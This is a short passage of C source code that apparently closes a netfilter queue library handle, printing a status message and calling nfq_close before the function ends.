	printf("closing library handle\n");
	nfq_close(h);
}
